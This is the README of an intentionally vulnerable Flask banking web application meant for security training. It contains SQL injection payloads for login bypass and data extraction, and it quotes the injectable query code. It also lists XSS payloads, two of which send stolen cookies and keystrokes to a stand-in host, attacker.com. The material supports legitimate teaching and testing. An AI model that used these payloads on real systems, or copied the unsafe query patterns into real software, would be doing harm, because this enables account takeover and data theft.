# Vulnerable Fake Bank Application

⚠️ **WARNING**: This application contains **intentional security vulnerabilities** for educational and testing purposes only. **DO NOT** deploy in production or use with real data!

## Overview

A deliberately vulnerable fake banking web application demonstrating common web security vulnerabilities:

1. **SQL Injection** - Login bypass and data extraction
2. **Cross-Site Scripting (XSS)** - Stored XSS in messages and transaction notes
3. **Weak Session Management** - Predictable session tokens
4. **Information Disclosure** - Detailed error messages

## Quick Start

### Prerequisites

- Python 3.7+
- pip

### Installation

1. Run the setup script:
```bash
chmod +x setup.sh start.sh
./setup.sh
```

This will:
- Create `.env` file from `.env.example`
- Create a virtual environment
- Install dependencies (Flask, Werkzeug, python-dotenv)
- Initialize the SQLite database with test data

2. (Optional) Configure settings:
```bash
nano .env
```

Adjust settings like:
- `HOST` and `PORT` - Server binding
- `DEBUG` - Debug mode
- `SHOW_VULNERABILITY_HINTS` - Display vulnerability hints in UI
- `ENABLE_REQUEST_LOGGING` - Log all requests to file
- And more (see Configuration section)

### Running the Application

```bash
./start.sh
```

Or manually:
```bash
source venv/bin/activate
python3 app.py
```

The application will start on `http://127.0.0.1:8200` (or configured HOST:PORT)

## Test Accounts

| Username    | Password    | Balance      |
|-------------|-------------|--------------|
| admin       | admin123    | $50,000.00   |
| john.doe    | password    | $15,234.50   |
| jane.smith  | qwerty      | $8,750.25    |
| bob.wilson  | 123456      | $3,421.00    |
| alice.jones | password123 | $12,890.75   |

## Configuration

The application is configured via the `.env` file. All settings have sensible defaults.

### Server Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `HOST` | `127.0.0.1` | Server host (use `0.0.0.0` for external access) |
| `PORT` | `8200` | Server port |
| `DEBUG` | `true` | Flask debug mode |

### Database Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `DB_PATH` | `bank.db` | SQLite database file path |

### Security Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `SECRET_KEY` | `insecure_secret_key_12345` | Flask secret key (intentionally weak) |
| `SESSION_COOKIE_NAME` | `bank_session` | Session cookie name |
| `SESSION_TIMEOUT` | `3600` | Session timeout in seconds |

### Application Settings

| Variable | Default | Description |
|----------|---------|-------------|
| `MAX_TRANSACTIONS` | `10` | Number of transactions to display |
| `MAX_MESSAGES` | `5` | Number of messages to display |
| `SHOW_DETAILED_ERRORS` | `true` | Show SQL errors (for demonstration) |
| `SHOW_VULNERABILITY_HINTS` | `true` | Display vulnerability hints in UI |
| `SHOW_TEST_ACCOUNTS` | `true` | Display test account credentials in login form |

### Logging Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `ENABLE_REQUEST_LOGGING` | `true` | Log all requests to file |
| `LOG_FILE` | `bank_access.log` | Log file path |

### Example Configurations

**Run on a different port with hints disabled:**
```bash
# Edit .env
HOST=0.0.0.0
PORT=8080
SHOW_VULNERABILITY_HINTS=false
```

**Production-like mode (hide hints and test accounts):**
```bash
# Edit .env
SHOW_VULNERABILITY_HINTS=false
SHOW_TEST_ACCOUNTS=false
SHOW_DETAILED_ERRORS=false
```

## Vulnerabilities & Test Payloads

### 1. SQL Injection - Login Bypass

**Vulnerability Location**: Login form (username field)

**Test Payloads**:
```
Username: admin' --
Password: anything

Username: ' OR '1'='1
Password: ' OR '1'='1

Username: admin' OR '1'='1' --
Password: (leave empty or anything)
```

**What happens**: Bypasses authentication and logs in as the first user (admin)

**Code Location**: `app.py` line ~140
```python
query = f"SELECT id, username, balance FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 2. SQL Injection - Data Extraction

**Vulnerability Location**: Transaction search form

**Test Payloads**:
```
Search: ' UNION SELECT username, password, email FROM users --

Search: ' UNION SELECT 'user', 'pass', username || ':' || password FROM users --
```

**What happens**: Extracts sensitive data from other database tables

**Code Location**: `app.py` line ~217
```python
search_query = f"SELECT date, amount, description FROM transactions WHERE user_id = {session['user_id']} AND description LIKE '%{query}%'"
```

### 3. Cross-Site Scripting (XSS)

**Vulnerability Location**: Message posting feature

**Test Payloads**:
```html
<script>alert('XSS Vulnerability!')</script>

<img src=x onerror=alert('XSS')>

<iframe src="javascript:alert('XSS')">

<svg onload=alert('XSS')>

<body onload=alert('XSS')>
```

**What happens**: JavaScript code executes in other users' browsers when they view the messages

**Code Location**:
- `app.py` line ~193 (no sanitization)
- `app.py` line ~126 (template uses `|safe` filter)

### 4. Advanced Attack Scenarios

#### Scenario 1: Credential Theft via SQL Injection
```sql
Search: ' UNION SELECT username, password, 'Stolen: ' || email FROM users --
```

#### Scenario 2: Session Hijacking via XSS
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

#### Scenario 3: Keylogger via XSS
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

## Security Best Practices (What's Missing)

This application violates many security best practices:

❌ **No prepared statements** - Use parameterized queries
❌ **No input validation** - Validate and sanitize all user input
❌ **No output encoding** - Escape HTML entities in output
❌ **No CSRF protection** - Implement anti-CSRF tokens
❌ **Weak session management** - Use secure, random session tokens
❌ **Detailed error messages** - Don't expose system internals
❌ **No rate limiting** - Implement brute force protection
❌ **No HTTPS** - Always use TLS in production
❌ **Hardcoded secrets** - Use environment variables
❌ **No Content Security Policy** - Implement CSP headers

## Educational Use

This application is designed for:
- Security training and awareness
- Penetration testing practice
- Demonstrating vulnerability exploitation
- Testing security scanning tools (like ECHO)
- Learning secure coding practices

## Files Structure

```
sql_xss_bank/
├── app.py              # Main Flask application (vulnerable)
├── init_db.py          # Database initialization script
├── requirements.txt    # Python dependencies
├── setup.sh           # Setup and installation script
├── start.sh           # Application start script
├── README.md          # This file
└── bank.db            # SQLite database (created after setup)
```

## License

Educational use only. No warranty provided.

## Disclaimer

The vulnerabilities in this application are **intentional** and for **educational purposes only**. Using these techniques against systems without authorization is illegal. Always obtain proper permission before conducting security testing.
